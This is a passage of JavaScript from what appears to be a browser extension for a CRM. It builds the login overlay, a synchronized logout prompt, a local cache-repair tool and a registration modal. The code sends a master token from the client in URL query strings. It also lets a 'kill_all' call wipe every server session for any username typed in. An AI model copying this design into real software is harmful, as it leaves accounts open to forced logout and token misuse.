            localStorage.setItem('SST_SYNC_SHOW_LOGOUT', Date.now().toString());
            window.dispatchEvent(new CustomEvent('SST_SHOW_LOGOUT_PROMPT'));
        };
        document.body.appendChild(btn);
    }

    // 🔥 EVENTO GLOBAL DE CONFIRMACIÓN DE LOGOUT SINCRONIZADO 🔥
    window.addEventListener('SST_SHOW_LOGOUT_PROMPT', () => {
        if (document.getElementById('sst-logout-modal-sync')) return; 
        
        const overlay = document.createElement('div');
        overlay.id = 'sst-logout-modal-sync';
        Object.assign(overlay.style, {
            position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
            backgroundColor: 'rgba(15, 23, 42, 0.85)', zIndex: '2147483647',
            display: 'flex', justifyContent: 'center', alignItems: 'flex-start', paddingTop: '20px', backdropFilter: 'blur(5px)',
            fontFamily: 'system-ui, -apple-system, sans-serif'
        });

        const modal = document.createElement('div');
        Object.assign(modal.style, {
            background: '#1e293b', padding: '25px', borderRadius: '12px', border: `1px solid #ef4444`,
            width: '420px', maxWidth: '90%', color: 'white', boxShadow: `0 15px 40px rgba(0,0,0,0.6), 0 0 15px #ef444440`,
            textAlign: 'center'
        });

        blindarElemento(overlay); 

        modal.innerHTML = `
            <h3 style="margin: 0 0 15px 0; color: #ef4444; font-size: 20px; font-weight: bold;">🚪 Cerrar Sesión</h3>
            <p style="margin: 0 0 25px 0; font-size: 15px; color: #cbd5e1; line-height: 1.5;">¿Estás seguro de querer <strong>cerrar tu sesión</strong> en el CRM?</p>
            <div style="display: flex; justify-content: center; gap: 15px;">
                <button id="btn-sync-logout-cancel" style="background: transparent; border: 1px solid #64748b; color: #cbd5e1; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s;">Cancelar</button>
                <button id="btn-sync-logout-confirm" style="background: #ef4444; border: none; color: white; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; box-shadow: 0 0 10px #ef444480; transition: 0.2s;">Sí, Cerrar</button>
            </div>
        `;

        const btnCancel = modal.querySelector('#btn-sync-logout-cancel');
        const btnConfirm = modal.querySelector('#btn-sync-logout-confirm');
        
        btnCancel.onmouseover = () => btnCancel.style.background = 'rgba(100, 116, 139, 0.2)';
        btnCancel.onmouseout = () => btnCancel.style.background = 'transparent';
        btnConfirm.onmouseover = () => btnConfirm.style.transform = 'scale(1.05)';
        btnConfirm.onmouseout = () => btnConfirm.style.transform = 'scale(1)';

        // Al Cancelar: Manda señal a TODAS las pestañas para que oculten la ventana
        btnCancel.onclick = () => { 
            overlay.remove(); 
            localStorage.setItem('SST_SYNC_CANCEL_LOGOUT', Date.now().toString());
        };
        
        // Al Aceptar: Cierra la sesión (la red se encargará de desconectar a todos)
        btnConfirm.onclick = () => { 
            overlay.remove(); 
            logoutAndClean(); 
        };

        overlay.appendChild(modal);
        document.body.appendChild(overlay);
    });
// 🔥 FUNCIÓN GLOBAL DE REPARACIÓN (SOLO LIMPIEZA LOCAL) 🔥
    window.SST_GLOBAL_REPAIR = async () => {
        const result = await mostrarModalReparacion();
        if (!result.confirmado) return;
        
        const targetBtn = document.getElementById('btn-auth-repair-global') || document.createElement('button');
        targetBtn.innerHTML = '<span style="font-size:16px;">⏳</span>';

        const mostrarProgreso = (texto, icono, color) => {
            let cartel = document.getElementById('toast-reparacion');
            if (!cartel) {
                cartel = document.createElement('div');
                cartel.id = 'toast-reparacion';
                Object.assign(cartel.style, {
                    position: 'fixed', top: '80px', left: '50%', transform: 'translateX(-50%) translateY(-20px)',
                    backgroundColor: 'rgba(15, 23, 42, 0.95)', border: `1px solid ${color}`,
                    color: 'white', padding: '12px 25px', borderRadius: '50px',
                    zIndex: '2147483647', fontWeight: 'bold', fontSize: '14px',
                    boxShadow: `0 10px 30px ${color}40`, display: 'flex', alignItems: 'center', gap: '10px',
                    backdropFilter: 'blur(10px)', transition: 'all 0.3s', opacity: '0'
                });
                document.body.appendChild(cartel);
                requestAnimationFrame(() => { cartel.style.opacity = '1'; cartel.style.transform = 'translateX(-50%) translateY(0)'; });
            } else {
                cartel.style.border = `1px solid ${color}`;
                cartel.style.boxShadow = `0 10px 30px ${color}40`;
            }
            cartel.innerHTML = `<span style="font-size:18px; animation: pulse 1s infinite alternate;">${icono}</span> <span>${texto}</span>`;
        };

        if (!document.getElementById('anim-pulse')) {
            const style = document.createElement('style');
            style.id = 'anim-pulse';
            style.innerHTML = `@keyframes pulse { from { transform: scale(1); } to { transform: scale(1.2); } }`;
            document.head.appendChild(style);
        }

        try {
            // 🌟 RESPALDO DE PLANTILLAS ANTES DE BORRAR EL CACHÉ 🌟
            const backupPlantillas = localStorage.getItem('CUSTOM_BTNS_LIST');

            mostrarProgreso('Reiniciando memoria local...', '♻️', '#f59e0b'); 
            
            // 🔥 BORRADO PURAMENTE LOCAL, SE ELIMINÓ EL FETCH AL SCRIPT URL
            localStorage.clear(); 
            sessionStorage.clear();
            try { if (chrome && chrome.storage && chrome.storage.local) chrome.storage.local.clear(); } catch(e) {}
            
            // 🌟 RESTAURACIÓN AUTOMÁTICA DE PLANTILLAS 🌟
            if (backupPlantillas) {
                localStorage.setItem('CUSTOM_BTNS_LIST', backupPlantillas);
            }

            mostrarProgreso('¡Limpieza Completada!', '✅', '#10b981'); 
            
            setTimeout(() => window.location.reload(true), 1500);

        } catch (e) {
            targetBtn.innerHTML = '<span style="font-size:24px; font-weight:bold; padding-bottom:4px; padding-right:2px;">↺</span>';
            mostrarProgreso('Error al limpiar caché', '❌', '#ef4444');
            setTimeout(() => {
                const cartel = document.getElementById('toast-reparacion');
                if (cartel) {
                    cartel.style.opacity = '0';
                    setTimeout(() => cartel.remove(), 300);
                }
            }, 4000);
        }
    };

    // 🖥️ UI: BOTÓN DE REPARACIÓN (Solo se muestra en el login)
    function checkRepairButton() {
        if (!isValidCrmDomain()) return;

        const currentUrl = window.location.href.toLowerCase();
        const loggedUser = localStorage.getItem('usuarioLogueado');
        const existingBtn = document.getElementById('btn-auth-repair-global');

        // Solo visible en Login o cuando no hay sesión.
        if (loggedUser && !currentUrl.includes('/login')) {
            if (existingBtn) existingBtn.remove();
            return;
        }

        if (existingBtn) return;

        const btn = document.createElement('button');
        btn.id = 'btn-auth-repair-global';
        btn.innerHTML = '<span style="font-size:24px; font-weight:bold; padding-bottom:4px; padding-right:2px;">↺</span>';
        
        Object.assign(btn.style, {
            position: 'fixed', top: '0', right: '0', zIndex: '2147483647',
            width: '45px', height: '45px',
            backgroundColor: 'rgba(245, 158, 11, 0.1)', backdropFilter: 'blur(5px)',
            color: '#f59e0b', borderRadius: '0 0 0 24px',
            borderBottom: '1px solid #f59e0b', borderLeft: '1px solid #f59e0b', borderRight: 'none', borderTop: 'none',
            cursor: 'pointer', display: 'flex', justifyContent: 'center', alignItems: 'center', 
            transition: 'all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)'
        });

        btn.onmouseenter = () => {
            btn.style.width = '50px'; btn.style.height = '50px';
            btn.style.backgroundColor = 'rgba(245, 158, 11, 0.50)'; btn.style.color = '#ffffff'; btn.style.borderColor = '#f59e0b';
            btn.style.boxShadow = '0 0 15px rgba(245, 158, 11, 0.5), inset 0 0 10px rgba(245, 158, 11, 0.1)';
            btn.style.textShadow = '0 0 8px rgba(245, 158, 11, 1)';
        };
        btn.onmouseleave = () => {
            btn.style.width = '45px'; btn.style.height = '45px';
            btn.style.backgroundColor = 'rgba(245, 158, 11, 0.1)'; btn.style.color = '#f59e0b';
            btn.style.borderBottom = '1px solid #f59e0b'; btn.style.borderLeft = '1px solid #f59e0b';
            btn.style.boxShadow = 'none'; btn.style.textShadow = 'none';
        };

        btn.onclick = window.SST_GLOBAL_REPAIR;
        document.body.appendChild(btn);
    } // <--- ¡ESTA LLAVE FALTABA Y ROMPÍA TODO TU MENÚ!

    function logoutAndClean() {
        safeSendMessage({ action: 'detener_escucha_maestra' }); 
        
        const user = localStorage.getItem('usuarioLogueado');
        const sessId = localStorage.getItem('sessionId');
        
        if (user && sessId) {
            const url = new URL(API_URL);
            url.searchParams.append('token', MASTER_TOKEN);
            url.searchParams.append('action', 'logout');
            url.searchParams.append('usuario', user);
            url.searchParams.append('sessionId', sessId);
            try { safeSendMessage({ action: 'proxy_fetch', url: url.toString(), options: { method: 'GET' } }); } catch(e){}
        }
        
        // 1. Detener sonido de alerta si estaba sonando
        stopAlertSound(); 

        // 2. Limpieza normal
        clearAuthSession();
        document.getElementById('btn-auth-salir-listado')?.remove();
        document.getElementById('addon-session-timer')?.remove();
        removeOverlays(); // Quitar también la alerta roja
        showLoginOverlay();
    }

    function showLoginOverlay(callback = null) {
        if (document.getElementById('addon-login-overlay')) return;
        if (!isValidCrmDomain()) return;

        const overlay = document.createElement('div');
        overlay.id = 'addon-login-overlay';
        Object.assign(overlay.style, {
            position: 'fixed', top: 0, left: 0, width: '100%', height: '100%',
            backgroundColor: 'rgba(10, 15, 30, 0.65)', backdropFilter: 'blur(20px)', webkitBackdropFilter: 'blur(20px)',
            display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: '2147483646',
            fontFamily: "'Segoe UI', 'Roboto', sans-serif"
        });

        const styleEl = document.createElement('style');
        styleEl.innerHTML = `
            .crm-login-input::placeholder { color: rgba(255,255,255,0.7); font-weight: 300; }
            .crm-login-input:focus { background-color: rgba(255,255,255,0.2) !important; border-color: #fff !important; }
            .crm-login-btn:hover { background-color: #00A3E0 !important; transform: scale(1.02); }
            .crm-login-btn:active { transform: scale(0.98); }
        `;
        document.head.appendChild(styleEl);

        const formContainer = document.createElement('div');
        Object.assign(formContainer.style, { width: '400px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '25px', padding: '40px 20px', zIndex: 1 });

        const countryName = getCountryName();
        const title = document.createElement('div');
        title.innerHTML = `LOGIN <br><span style="font-size: 24px; font-weight: 300;">(${countryName})</span>`;
        Object.assign(title.style, { color: '#fff', fontSize: '32px', fontWeight: 'bold', textAlign: 'center', textTransform: 'uppercase', letterSpacing: '2px', textShadow: '0 2px 4px rgba(0,0,0,0.5)', marginBottom: '10px' });

        const createInput = (placeholder, type, iconChar) => {
            const wrap = document.createElement('div');
            Object.assign(wrap.style, { position: 'relative', width: '100%', maxWidth: '350px' });
            const inp = document.createElement('input');
            inp.type = type; inp.placeholder = placeholder; inp.className = 'crm-login-input';
            Object.assign(inp.style, {
                width: '100%', padding: '15px 50px 15px 25px', borderRadius: '50px',
                border: '2px solid rgba(255,255,255,0.4)', backgroundColor: 'rgba(255,255,255,0.1)',
                color: '#fff', fontSize: '16px', outline: 'none', textAlign: 'left', transition: 'all 0.3s', boxSizing: 'border-box',
                userSelect: 'auto', WebkitUserSelect: 'auto' // <-- AÑADIDO PARA BLINDAJE
            });
            const icon = document.createElement('span');
            if (type === 'password') {
                icon.innerText = '👁️'; 
                Object.assign(icon.style, { position: 'absolute', right: '20px', top: '50%', transform: 'translateY(-50%)', color: '#fff', fontSize: '20px', cursor: 'pointer', opacity: '0.9', zIndex: '10', userSelect: 'none' });
                icon.onclick = () => {
                    if (inp.type === 'password') { inp.type = 'text'; icon.innerText = '🙈'; } 
                    else { inp.type = 'password'; icon.innerText = '👁️'; }
                };
            } else {
                icon.innerText = iconChar;
                Object.assign(icon.style, { position: 'absolute', right: '20px', top: '50%', transform: 'translateY(-50%)', color: '#fff', fontSize: '20px', pointerEvents: 'none', opacity: '0.9' });
            }
            wrap.append(inp, icon);
            return { wrap, inp };
        };

        // 👇 INICIO: INPUTS CON FORZADO DE FORMATO Y ORDEN CORREGIDO 👇
        const userInput = createInput('Ingrese su usuario', 'text', '👤');
        userInput.inp.addEventListener('input', function() {
            this.value = this.value.toUpperCase().replace(/\s+/g, ''); // Forzar Mayúsculas y bloquear espacios
        });

        const passInput = createInput('Ingrese su contraseña', 'password', '');
        passInput.inp.addEventListener('input', function() {
            this.value = this.value.replace(/\s+/g, ''); // Bloquear espacios (Mayúsculas/Minúsculas libres)
        });

        const serverInput = createInput('Escribe tu servidor', 'text', '🌐');
        
        // 🔥 NUEVO: VALIDACIÓN EN TIEMPO REAL Y GUARDADO EN LOCALSTORAGE 🔥
        serverInput.inp.addEventListener('input', function() {
            const val = this.value.toLowerCase().replace(/\s+/g, '');
            this.value = val;
            
            if (val === '') {
                this.style.borderColor = 'rgba(255,255,255,0.4)';
                this.style.boxShadow = 'none';
            } else if (SERVERS_DB[val]) {
                this.style.borderColor = '#34d399'; // Verde neón (Éxito)
                this.style.boxShadow = '0 0 10px rgba(52, 211, 153, 0.5)';
                
                // Guardar en memoria en tiempo real
                localStorage.setItem('serverSubdomain', val);
                CEREBRO_URL = SERVERS_DB[val].script;
                FIREBASE_URL = SERVERS_DB[val].firebase;
                API_URL = CEREBRO_URL;
                
                
            } else {
                this.style.borderColor = '#ef4444'; // Rojo (Peligro)
                this.style.boxShadow = '0 0 10px rgba(239, 68, 68, 0.5)';
            }
        });

        const currentSub = localStorage.getItem('serverSubdomain');
        if (currentSub) {
            serverInput.inp.value = currentSub;
            // Disparar el evento para que se pinte de verde automáticamente al cargar
            serverInput.inp.dispatchEvent(new Event('input'));
        }
        // 👆 FIN INPUTS CON FORZADO DE FORMATO 👇

        const btnLogin = document.createElement('button');
        btnLogin.id = 'crm-main-login-btn'; 
        btnLogin.innerText = 'INGRESAR';
        btnLogin.className = 'crm-login-btn';
        Object.assign(btnLogin.style, {
            width: '100%', maxWidth: '350px', padding: '15px', borderRadius: '50px', border: 'none',
            backgroundColor: '#00b4ff', color: '#fff', fontSize: '18px', fontWeight: 'bold',
            letterSpacing: '1px', cursor: 'pointer', marginTop: '10px', boxShadow: '0 4px 15px rgba(0, 180, 255, 0.4)', transition: 'all 0.3s'
        });

        const btnRepair = document.createElement('button');
        btnRepair.id = 'crm-hidden-repair-btn';
        btnRepair.innerHTML = '🧹 REPARAR EXTENSIÓN';
        Object.assign(btnRepair.style, {
            display: 'none', marginTop: '10px', backgroundColor: 'rgba(220, 38, 38, 0.1)', border: '1px solid #ef4444', color: '#ef4444',
            padding: '8px 20px', borderRadius: '20px', fontSize: '11px', fontWeight: 'bold', cursor: 'pointer', transition: 'all 0.3s',
            letterSpacing: '1px', width: 'auto', maxWidth: '350px'
        });
        btnRepair.onmouseenter = () => { btnRepair.style.backgroundColor = '#ef4444'; btnRepair.style.color = '#fff'; btnRepair.style.boxShadow = '0 0 10px rgba(239, 68, 68, 0.5)'; };
        btnRepair.onmouseleave = () => { btnRepair.style.backgroundColor = 'rgba(220, 38, 38, 0.1)'; btnRepair.style.color = '#ef4444'; btnRepair.style.boxShadow = 'none'; };

        btnRepair.onclick = async () => {
            const inputUser = userInput.inp.value.trim();

            if (!inputUser) {
                msgBox.innerText = '⚠️ Escribe tu Usuario para Reparar';
                msgBox.style.color = '#fbbf24';
                userInput.inp.style.borderColor = '#fbbf24';
                setTimeout(() => userInput.inp.style.borderColor = 'rgba(255,255,255,0.4)', 2000);
                return;
            }

            if (confirm(`🚨 MODO RECUPERACIÓN TOTAL\n\nUsuario: ${inputUser}\n\n1. ELIMINAR todas tus sesiones del Servidor.\n2. Reiniciar la extensión de fábrica.\n3. Tus plantillas se mantendrán guardadas.\n\n¿Proceder?`)) {
                btnRepair.innerText = '🔥 BORRANDO SESIONES...'; btnRepair.disabled = true;

                try {
                    // 🌟 RESPALDO DE PLANTILLAS 🌟
                    const backupPlantillas = localStorage.getItem('CUSTOM_BTNS_LIST');

                    const urlKill = new URL(API_URL);
                    urlKill.searchParams.append('token', MASTER_TOKEN); // 🛡️ LLAVE MAESTRA
                    urlKill.searchParams.append('action', 'kill_all');
                    urlKill.searchParams.append('usuario', inputUser);
                    
                    await new Promise(resolve => {
                        safeSendMessage({ action: 'proxy_fetch', url: urlKill.toString(), options: { method: 'GET' } }, resolve);
                    });

                    btnRepair.innerText = '♻️ REINICIANDO...';
                    localStorage.clear(); sessionStorage.clear();
                    try { if (chrome && chrome.storage && chrome.storage.local) chrome.storage.local.clear(); } catch(e) {}
                    
                    // 🌟 RESTAURACIÓN DE PLANTILLAS 🌟
                    if (backupPlantillas) {
                        localStorage.setItem('CUSTOM_BTNS_LIST', backupPlantillas);
                    }

                    setTimeout(() => window.location.reload(true), 1500);

                } catch (e) {
                    btnRepair.innerText = '❌ ERROR';
                    msgBox.innerText = '⛔ ' + (e.message || 'Error de conexión');
                    setTimeout(() => { btnRepair.innerText = '🧹 REPARAR EXTENSIÓN'; btnRepair.disabled = false; }, 3000);
                }
            }
        };

        const msgBox = document.createElement('div');
        msgBox.id = 'temp-msg-box'; // Lo declaramos aquí de una vez
        Object.assign(msgBox.style, { 
            minHeight: '0', fontSize: '15px', fontWeight: 'bold', textAlign: 'center', 
            transition: 'all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)', 
            borderRadius: '12px', boxSizing: 'border-box', width: '100%', maxWidth: '350px',
            textShadow: '0 1px 2px rgba(0,0,0,0.5)', margin: '0 auto', opacity: '0', 
            transform: 'scale(0.9)', lineHeight: '1.4'
        });

        // 🔥 MAGIA: Observador automático para convertir cualquier texto en una Burbuja Estética 🔥
        new MutationObserver(() => {
            const text = msgBox.innerText.trim();
            if (text !== '') {
                msgBox.style.padding = '12px 15px';
                msgBox.style.marginTop = '15px';
                msgBox.style.opacity = '1';
                msgBox.style.transform = 'scale(1)'; // Animación de rebote (pop-in)
                
                const lowerText = text.toLowerCase();
                
                // 🔴 BURBUJA DE ERROR (Credenciales incorrectas, no existe, etc)
                if (lowerText.includes('❌') || lowerText.includes('error') || lowerText.includes('incorrect') || lowerText.includes('no existe') || lowerText.includes('falló') || lowerText.includes('⛔')) {
                    msgBox.style.backgroundColor = 'rgba(239, 68, 68, 0.15)';
                    msgBox.style.border = '1px solid #ef4444';
                    msgBox.style.color = '#fca5a5'; 
                    msgBox.style.boxShadow = '0 5px 15px rgba(239, 68, 68, 0.25)';
                } 
                // 🟡 BURBUJA DE ADVERTENCIA (Faltan campos, etc)
                else if (lowerText.includes('⚠️') || lowerText.includes('requerida')) {
                    msgBox.style.backgroundColor = 'rgba(245, 158, 11, 0.15)';
                    msgBox.style.border = '1px solid #f59e0b';
                    msgBox.style.color = '#fcd34d';
                    msgBox.style.boxShadow = '0 5px 15px rgba(245, 158, 11, 0.25)';
                } 
                // 🟢 BURBUJA DE ÉXITO (Acceso autorizado)
                else if (lowerText.includes('✅') || lowerText.includes('autorizado') || lowerText.includes('borradas')) {
                    msgBox.style.backgroundColor = 'rgba(16, 185, 129, 0.15)';
                    msgBox.style.border = '1px solid #10b981';
                    msgBox.style.color = '#6ee7b7';
                    msgBox.style.boxShadow = '0 5px 15px rgba(16, 185, 129, 0.25)';
                } 
                // 🔵 BURBUJA NEUTRAL / CARGANDO (Verificando, ingresando...)
                else {
                    msgBox.style.backgroundColor = 'rgba(56, 189, 248, 0.15)';
                    msgBox.style.border = '1px solid #38bdf8';
                    msgBox.style.color = '#bae6fd';
                    msgBox.style.boxShadow = '0 5px 15px rgba(56, 189, 248, 0.25)';
                }
            } else {
                // Si se limpia el texto, escondemos la burbuja elegantemente
                msgBox.style.padding = '0';
                msgBox.style.marginTop = '0';
                msgBox.style.opacity = '0';
                msgBox.style.transform = 'scale(0.9)';
                msgBox.style.border = 'none';
                msgBox.style.backgroundColor = 'transparent';
                msgBox.style.boxShadow = 'none';
            }
        }).observe(msgBox, { childList: true, characterData: true, subtree: true });

        // 👇 INICIO BLOQUE NUEVO: ENLACES Y MODALES DE REGISTRO/RECUPERACIÓN 👇
        const extraLinksDiv = document.createElement('div');
        Object.assign(extraLinksDiv.style, { display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px', width: '100%', maxWidth: '350px', marginTop: '5px' });
        
        const topLinksRow = document.createElement('div');
        Object.assign(topLinksRow.style, { display: 'flex', justifyContent: 'space-between', width: '100%' });

        const linkRegister = document.createElement('a');
        linkRegister.innerText = 'Crear cuenta nueva';
        Object.assign(linkRegister.style, { color: '#34d399', cursor: 'pointer', fontSize: '13px', textDecoration: 'none', fontWeight: 'bold' });
        linkRegister.onmouseenter = () => linkRegister.style.textDecoration = 'underline';
        linkRegister.onmouseleave = () => linkRegister.style.textDecoration = 'none';

        const linkRecover = document.createElement('a');
        linkRecover.innerText = '¿Olvidaste tu contraseña?';
        Object.assign(linkRecover.style, { color: '#94a3b8', cursor: 'pointer', fontSize: '13px', textDecoration: 'none' });
        linkRecover.onmouseenter = () => linkRecover.style.textDecoration = 'underline';
        linkRecover.onmouseleave = () => linkRecover.style.textDecoration = 'none';

        topLinksRow.append(linkRegister, linkRecover);

        const linkChangePass = document.createElement('a');
        linkChangePass.innerText = 'Cambiar contraseña actual';
        Object.assign(linkChangePass.style, { color: '#38bdf8', cursor: 'pointer', fontSize: '13px', textDecoration: 'none', fontWeight: 'bold' });
        linkChangePass.onmouseenter = () => linkChangePass.style.textDecoration = 'underline';
        linkChangePass.onmouseleave = () => linkChangePass.style.textDecoration = 'none';

        extraLinksDiv.append(topLinksRow, linkChangePass);

        const crearSubModal = (tituloHtml, contenidoHtml) => {
            const subOverlay = document.createElement('div');
            Object.assign(subOverlay.style, {
                position: 'absolute', top: 0, left: 0, width: '100%', height: '100%',
                backgroundColor: 'rgba(10, 15, 30, 0.95)', backdropFilter: 'blur(10px)',
                display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: '10',
                borderRadius: 'inherit'
            });

            const box = document.createElement('div');
            Object.assign(box.style, {
                width: '100%', maxWidth: '380px', padding: '30px 20px', display: 'flex', flexDirection: 'column', gap: '15px'
            });

            box.innerHTML = `<h2 style="color: white; text-align: center; margin-top:0; margin-bottom: 10px;">${tituloHtml}</h2>` + contenidoHtml;
            subOverlay.appendChild(box);
            overlay.appendChild(subOverlay);
            return { subOverlay, box };
        };

        linkRegister.onclick = () => {
            const { subOverlay, box } = crearSubModal('📝 Registro de Agente', `
                <input type="text" id="reg-user" placeholder="Usuario" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; margin-bottom: 5px;">
                
                <!-- 👇 Contraseñas movidas aquí arriba 👇 -->
                <div style="position: relative; width: 100%; margin-bottom: 5px;">
                    <input type="password" id="reg-pass" placeholder="Contraseña Nueva" class="crm-login-input" style="width: 100%; padding: 12px 50px 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box;">
                    <span id="reg-pass-eye" style="position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: #fff; font-size: 20px; cursor: pointer; opacity: 0.9; user-select: none; z-index: 10;">👁️</span>
                </div>
                <input type="password" id="reg-pass-repeat" placeholder="Repetir Contraseña Nueva" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; margin-bottom: 5px; transition: 0.3s;">

                <!-- 👇 Nombre y correo movidos hacia abajo 👇 -->
                <input type="text" id="reg-name" placeholder="Nombre y Apellido" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; margin-bottom: 5px;">
                <input type="email" id="reg-email" placeholder="Correo para recuperar clave" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; margin-bottom: 5px;">
                
                <!-- 👇 Contenedor para el menú de banderas Glassmorphism 👇 -->
                <input type="hidden" id="reg-country" value="BO">
                <div id="custom-country-wrap" style="position: relative; width: 100%; margin-top: 5px;"></div>

                <input type="text" id="reg-server" placeholder="Servidor" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; margin-top: 5px; transition: border-color 0.3s, box-shadow 0.3s;">

                <button id="btn-do-register" style="width: 100%; padding: 15px; border-radius: 50px; border: none; background: #34d399; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; box-shadow: 0 4px 15px rgba(52, 211, 153, 0.4);">CREAR CUENTA</button>
                <button id="btn-cancel-register" style="width: 100%; padding: 10px; border-radius: 50px; border: 1px solid #64748b; background: transparent; color: #94a3b8; font-weight: bold; cursor: pointer; margin-top: 5px;">Volver</button>
                <div id="reg-msg" style="text-align: center; font-size: 13px; font-weight: bold; min-height: 20px;"></div>
            `);

            // 🔥 CREAR EL PANEL LATERAL ABSOLUTO (FUERA DEL CENTRO) 🔥
            if (!document.getElementById('css-panel-info')) {
                const stylePanel = document.createElement('style');
                stylePanel.id = 'css-panel-info';
                // En pantallas pequeñas se ocultará para no aplastar el formulario
                stylePanel.innerHTML = `@media (max-width: 900px) { .panel-info-server { display: none !important; } }`;
                document.head.appendChild(stylePanel);
            }

            const panelIzquierdo = document.createElement('div');
            panelIzquierdo.className = 'panel-info-server';
            Object.assign(panelIzquierdo.style, {
                position: 'absolute',
                left: '8%', // Lo enviamos bien a la izquierda
                top: '50%',
                transform: 'translateY(-50%)',
                width: '280px',
                background: 'rgba(15, 23, 42, 0.85)',
                backdropFilter: 'blur(10px)',
                border: '2px solid #38bdf8',
                padding: '30px 25px',
                borderRadius: '20px',
                fontSize: '13px',
                color: '#e2e8f0',
                lineHeight: '1.6',
                textAlign: 'center',
                boxShadow: '0 15px 40px rgba(0,0,0,0.5), 0 0 20px rgba(56,189,248,0.2)',
                display: 'flex',
                flexDirection: 'column',
                justifyContent: 'center',
                zIndex: '10',
                overflow: 'hidden'
            });

            panelIzquierdo.innerHTML = `
                <div style="position: absolute; top: -30px; left: -30px; width: 120px; height: 120px; background: radial-gradient(circle, rgba(56,189,248,0.3) 0%, transparent 70%); border-radius: 50%; pointer-events: none;"></div>
                <div style="font-size: 38px; margin-bottom: 15px; text-shadow: 0 0 15px rgba(56,189,248,0.5);">ℹ️</div>
                <b style="color: #38bdf8; font-size: 17px; margin-bottom: 12px;">¿Trabajas individualmente?</b>
                <p style="margin: 0 0 20px 0; font-size: 14px;">Copia y pega este servidor para registrarte sin dependencia:</p>
                
                <!-- BOTÓN COPIABLE (Con Auto-Pegado) -->
                <div onclick="navigator.clipboard.writeText('server-57'); const icon = this.querySelector('span'); icon.innerText='✅'; setTimeout(()=>icon.innerText='📋', 1500); document.getElementById('reg-server').value='server-57'; document.getElementById('reg-server').dispatchEvent(new Event('input'));" style="display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.6); padding: 15px; border-radius: 12px; border: 1px dashed #38bdf8; cursor: pointer; transition: all 0.2s;" onmouseover="this.style.background='rgba(56, 189, 248, 0.2)'" onmouseout="this.style.background='rgba(0,0,0,0.6)'" title="Clic para Copiar y Pegar automáticamente">
                    <b style="color: #34d399; font-size: 20px; letter-spacing: 1px; margin-right: 12px; pointer-events: none;">server-57</b>
                    <span style="font-size: 20px; pointer-events: none;">📋</span>
                </div>
                
                <div style="margin-top: 25px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1);">
                    <p style="margin: 0 0 10px 0; color: #94a3b8; font-size: 13px;">Si vienes de un TL, pregúntale el ID de su servidor.</p>
                    <span style="color: #fcd34d; font-size: 10px; letter-spacing: 1px; text-transform: uppercase; font-weight: bold; background: rgba(252, 211, 77, 0.1); padding: 4px 8px; border-radius: 4px;">Para Accesos Especiales</span>
                </div>
            `;
            
            // Inyectar el panel lateral independiente del cuadro central
            subOverlay.appendChild(panelIzquierdo);

            // 👇 INICIO: LÓGICA DEL DESPLEGABLE GLASSMORPHISM CON BANDERAS PNG 👇
            const countryWrap = box.querySelector('#custom-country-wrap');
            const hiddenCountryInput = box.querySelector('#reg-country');
            
            // Array con los datos limpios, sin precios y con URLs directas de banderas PNG
            const flagData = [
                { code: 'BO', name: 'Bolivia', img: 'https://flagcdn.com/w40/bo.png' },
                { code: 'CO', name: 'Colombia', img: 'https://flagcdn.com/w40/co.png' },
                { code: 'VE', name: 'Venezuela', img: 'https://flagcdn.com/w40/ve.png' },
                { code: 'OT', name: 'Otro País', img: 'https://cdn-icons-png.flaticon.com/128/3233/3233480.png' } // Ícono de planeta
            ];

            const customSelect = document.createElement('div');
            Object.assign(customSelect.style, {
                width: '100%', padding: '12px 20px', borderRadius: '50px',
                border: '2px solid rgba(255,255,255,0.4)', backgroundColor: 'rgba(255,255,255,0.1)',
                color: '#fff', fontSize: '15px', cursor: 'pointer', boxSizing: 'border-box',
                display: 'flex', justifyContent: 'space-between', alignItems: 'center', transition: 'all 0.3s'
            });

            const selectedContent = document.createElement('div');
            Object.assign(selectedContent.style, { display: 'flex', alignItems: 'center', gap: '10px' });
            selectedContent.innerHTML = `<img src="${flagData[0].img}" style="width: 24px; border-radius: 4px;"> <span style="font-weight: bold;">${flagData[0].name}</span>`;
            
            const arrowIcon = document.createElement('span');
            arrowIcon.innerText = '▼';
            arrowIcon.style.transition = 'transform 0.3s';
            
            customSelect.append(selectedContent, arrowIcon);

            const optionsContainer = document.createElement('div');
            Object.assign(optionsContainer.style, {
                position: 'absolute', top: 'calc(100% + 5px)', left: '0', width: '100%',
                backgroundColor: 'rgba(15, 23, 42, 0.95)', backdropFilter: 'blur(15px)', webkitBackdropFilter: 'blur(15px)',
                border: '1px solid rgba(255,255,255,0.2)', borderRadius: '20px', padding: '10px 0',
                boxShadow: '0 10px 30px rgba(0,0,0,0.8)', display: 'none', flexDirection: 'column', zIndex: '101'
            });

            flagData.forEach(item => {
                const optDiv = document.createElement('div');
                Object.assign(optDiv.style, {
